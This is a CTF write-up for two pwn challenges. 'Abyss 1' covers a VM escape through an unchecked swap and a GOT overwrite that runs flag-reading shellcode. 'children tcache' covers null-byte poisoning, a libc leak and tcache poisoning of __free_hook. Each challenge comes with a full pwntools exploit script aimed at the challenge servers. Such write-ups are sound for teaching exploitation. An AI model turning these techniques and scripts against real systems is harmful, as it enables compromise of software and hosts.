## Abyss 1

This challenge is the VM escape from custom VM to user level arbitrary code execution. After some reverse engineering, we can find that there are vulnerabilities in `swap` and `rotate`, although I have used the `swap` only.

```c
_DWORD *swap_()
{
  int v0; // ST04_4
  _DWORD *result; // rax

  v0 = stack[sp_nxt - 1];
  stack[sp_nxt - 1] = stack[sp_nxt - 2];
  result = stack;
  stack[sp_nxt - 2] = v0;
  return result;
}
```

It is obvious that the value of `sp_nxt` is not checked, so if `sp_nxt` is 1, it will swap `stack[0]` and `stack[-1]`, and if we look at the memory layout, we can find that `stack[-1]` is exactly `sp_nxt`, which means that we can control the stack pointer to achieve arbitrary `read/write`.

The idea is to add a constant offset to the got table entry of the an uncalled function, such as `write`, which points to the program address(PLT entry) instead of libc, because it is not dynamically resolved yet. In this way, we can manipulate the function pointer to anywhere within the program image, including the `store` global array. Therefore, according to the hint, we can write the shellcode into that array, and let `write` to point to that array, and call the write function, to get arbitrary code execution.

However, when I was inspecting the address in the got table with `writed` VM instruction, I found a tricky part, which got me stuck for many hours. If you run user program directly(`./user.elf`) in Linux, the program address will begin as `0x5x`, and the libc address will begin as `0x7f`; but in this customed OS, they both begin as `0x7f`, which misled me initially and made me think that there is no dynamic resolution but it instead would load the libc addresses to got table when the program begins. The reason is probably that it inits the program using `ld.so.2 ./user.elf`, and if you do this in Linux, the program address will begin as `0x7f` too.

In addition, in the customed OS, the address of `ld` begins with `0x5x`, but if you run that command in Linux, the `ld` will begin as `0x7f`, which is quite different.

Finally, we need to decide what code to execute in order to get the flag, so we need to do some reversing for kernel first. After some reversing, we can find that the `syscall` table in kernel is `0x4020`, and so if we look at the `open` function:

```c
__int64 __fastcall open(const char *a1)
{
  unsigned int v1; // ebp
  char *v2; // rax
  __int64 v3; // rbx
  signed __int64 v4; // rax

  v1 = -14;
  if ( !(unsigned int)sub_FFF() )
    return v1;
  v1 = -12;
  v2 = strdup(a1);
  v3 = (__int64)v2;
  if ( !v2 )
    return v1;
  if ( (unsigned int)strcmp((__int64)v2, "ld.so.2")
    && (unsigned int)strcmp(v3, "/lib/x86_64-linux-gnu/libc.so.6")
    && (unsigned int)strcmp(v3, "/proc/sys/kernel/osrelease")
    && (unsigned int)strcmp(v3, "/etc/ld.so.cache")
    && (unsigned int)strcmp(v3, "./user.elf")
    && (v1 = -2, (unsigned int)strcmp(v3, "flag")) )
  {
    return v1;
  }
  v4 = sub_1183(v3);
  v1 = sub_E7E(v4);
  sub_1577(v3);
  return v1;
}
```

It is probably suggesting that the only files you can open are the files listed above, which include the flag, so the shellcode should just be `open("flag", 0)`, `read(fd, buf, 100)`, and `write(1, buf, 100)`.

The exp:

```python
from pwn import *

g_local=False
context.log_level='debug'
e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
store_idx = 0

if g_local:
	sh = process(['./hypervisor.elf','kernel.bin','ld.so.2','./user.elf'])#env={'LD_PRELOAD':'./libc.so.6'}
	#sh = process(['ld.so.2', './user.elf'])
	ONE_GADGET_OFF = 0x4526a
	UNSORTED_OFF = 0x3c4b78
	gdb.attach(sh)
else:
	ONE_GADGET_OFF = 0x4526a
	UNSORTED_OFF = 0x3c4b78
	sh = remote("35.200.23.198", 31733)
	#ONE_GADGET_OFF = 0x4557a

def get_qword():
	high = int(sh.recvuntil("\n")) & 0xffffffff
	low = int(sh.recvuntil("\n")) & 0xffffffff
	return (high << 0x20) + low


def write():
	return "\x2c"
def store():
	return "\x3a"
def fetch():
	return "\x3b"
def push(imm):
	return str(imm) + "\x01"
def writed():
	return "\x2e"
def rot():
	return "\x5c"
def add():
	return "\x2b"

asmcode = "push rbx\n"
asmcode += "mov rax,0x67616c66\n" #flag
asmcode += "push rax\n"
asmcode += "mov rdi,rsp\n"
asmcode += "xor rsi,rsi\n"
asmcode += "mov rax,2\n"
asmcode += "syscall\n" #open
asmcode += "mov rdi,rax\n"
asmcode += "call next\n"
asmcode += "next: pop rbx\n"
asmcode += "add rbx,0x300\n"
asmcode += "mov rsi,rbx\n"
asmcode += "mov rdx,100\n"
asmcode += "xor rax,rax\n"
asmcode += "syscall\n" #read
asmcode += "mov rsi,rbx\n"
asmcode += "mov rdi,1\n"
asmcode += "mov rdx,100\n"
asmcode += "mov rax,1\n"
asmcode += "syscall\n" #write
asmcode += "pop rbx\n"
asmcode += "pop rbx\n"
asmcode += "ret\n"

print len(asmcode)
shellcode = asm(asmcode, arch='amd64')

codelen = len(shellcode)

sh.recvuntil(" choice but keep going down.\n") + "\x90"

vmcode = ""

for i in xrange(0,codelen/4):
	vmcode += push(u32(shellcode[i*4:i*4+4]))
	vmcode += push(i)
	vmcode += store()

vmcode += str(((0x202028 - 0x2020A4) / 4) & 0xffffffff)
vmcode += rot()
#vmcode += writed() * (0x98/8) * 2
idx = codelen/4
vmcode += push(idx)
vmcode += store() #store high dword of write

vmcode += push(0x2034A8 - 0x796)
vmcode += add()

vmcode += push(idx)
vmcode += fetch()

vmcode += write()

sh.send(vmcode + "\n")

# for x in xrange(0,(0x98/8)):
# 	print hex(get_qword())

#0x17e50

sh.interactive()
```

## children tcache

My approach is not so elegant, which might not be the intended solution, so please don't criticize too harshly if you don't like it. :\)

The vulnerability is not so obvious at the first glance, but as you think about it again, it is not hard either.

```c
//in the add function
dest = (char *)malloc(size);
if ( !dest )
  exit(-1);
printf("Data:");
readstr(s, size);
strcpy(dest, s);
// null byte off by one, because '\0' will be added after string
```

We can just use null byte poisoning. But when a chunk is freed, `memset((void *)pbufs[v1], 0xDA, sizes[v1]);` will be executed first, which will overwrite all of the data in the chunk. For [null byte poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/poison_null_byte.c), we need to fake a `prev_size` to pass a check, but unfortunately we cannot do so due to such `memset` before `free`.

What I was thinking about is to construct a `0xda11` unsorted bin, and construct a `0xda00` as the `prev_size` by writing `0x00`s using null byte off by one. Then after overflowing, the size of unsorted bin becomes `0xda00`, which matches the `prev_size` exactly.

There are few points to note in this exploitation method: firstly, if there is a unsorted bin with size `0x4b0`, `malloc(0x490)` will also get you the whole chunk instead of seperating it into 2 chunks, because `0x10` chunk simply does not exist, which can enable us to construct `0xda00` at the end of the chunk; secondly, because the TCP package has the maximum size, do not send data with size larger than `0x500`, or else the `read` function will return even though the data are not read completely.

After obtaining the overlaped chunk using null byte poisoning, we can leak the libc address easily as usual, and rewrite the `fd` of a tcache chunk to enable the arbitrary chunk allocation. Different from fastbin, we don't need to fake the header, which is much easier. Also, the max index is 9, so the index is quite not enough. The reason is that we need to allocate about 7 times to get a `0xda00` chunk, given the maximum `malloc` size allowance being `0x2000`, but fortunately, we can exploit it with such maximum index exactly.

The exp:

```python
from pwn import *

g_local=False
context.log_level='debug'
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
UNSORTED_OFF = 0x3ebca0
if g_local:
	sh = process('./children_tcache')#env={'LD_PRELOAD':'./libc.so.6'}
	gdb.attach(sh)
else:
	sh = remote("54.178.132.125", 8763)
	#ONE_GADGET_OFF = 0x4557a

def add(size, data):
	sh.send("1\x00")
	sh.recvuntil("Size:")
	sh.send(str(size) + "\x00")
	sh.recvuntil("Data:")
	sh.send(data)
	sh.recvuntil("Your choice: ")

def dele(idx):
	sh.send("3\x00")
	sh.recvuntil("Index:")
	sh.send(str(idx) + "\x00")
	sh.recvuntil("Your choice: ")

def show(idx):
	sh.send("2\x00")
	sh.recvuntil("Index:")
	sh.send(str(idx) + "\x00")
	ret = sh.recvuntil("\n")
	sh.recvuntil("Your choice: ")
	return ret[:len(ret)-1]

for i in xrange(0,6):
	add(0x2000, "ab") #0-5
add(0x2000-0x250, "ab")

add(0x1010, "c") #7
for i in xrange(0,7):
	dele(i)
# hex(0xe070-0xda10) = 0x660

add(0x400, "a") #0
#0xda11 unsorted

for i in xrange(1,7):
	add(0x2000, "bs") #1-6
#0x19b1 unsorted

add(0x14F0, "bn") #8
#0x4b1 unsorted
for i in xrange(0,6):
	add(0x497 - i, "b".ljust(0x497 - i, "n")) #9
	#will still get the 0x4b1 size chunk, because there is no 0x10 chunk
	dele(9)
add(0x490, "b".ljust(0x490, "n")) #9
#0xda00 prevsize being constructed

dele(8) #delete 8 first to prevent top chunk consolidate
dele(7)
add(0x2000, "c1") #7
add(0x2000, "pad") #8
dele(9)

for i in xrange(1,7):
	dele(i)
#0xda11 unsorted, and x/4gx 0x8b0+0xda00 is
# 0x000000000000da00	0xdadadadadadadada
# 0x000000000000da10	0x0000000000000510

dele(0) #a
add(0x408, "a" * 0x408) #0, trigger vuln!
#0xda00 unsorted

# 1-6 9 empty

add(0x500, "b1") #1
add(0x1800, "b2") #2
add(0x200, "b3") #3

dele(3) #tcache
dele(1)
dele(7)
#all: 0x561abcfa3ae0 -> 0x7fea7da40ca0 (main_arena+96) -> 0x561abcf9f8b0 <- 0x561abcfa3ae0
#overlap unsorted bin
# 1 3-7 9

for i in xrange(0,5):
	add(0x2000, "/bin/sh\x00")
add(0x1A70, "remove all b from bins, now there is only bc chunk")

add(0x500, "should leak") #9
libc_addr = u64(show(2) + "\x00\x00") - UNSORTED_OFF
print hex(libc_addr)
dele(9)
dele(8) #free padding since we've already leaked, this frees some index
add(0x1D10, "reach tcache") #8
add(0x10, p64(libc_addr + e.symbols["__free_hook"]))
dele(8)
add(0x200, "hopefully works")
dele(4) #index reallllllly not sufficient!!!!!
add(0x200, p64(libc_addr + 0x4f322)) #0x40 one_gadget

sh.send("3\x00")
sh.recvuntil("Index:")
sh.send(str(5) + "\x00")

sh.interactive()
```

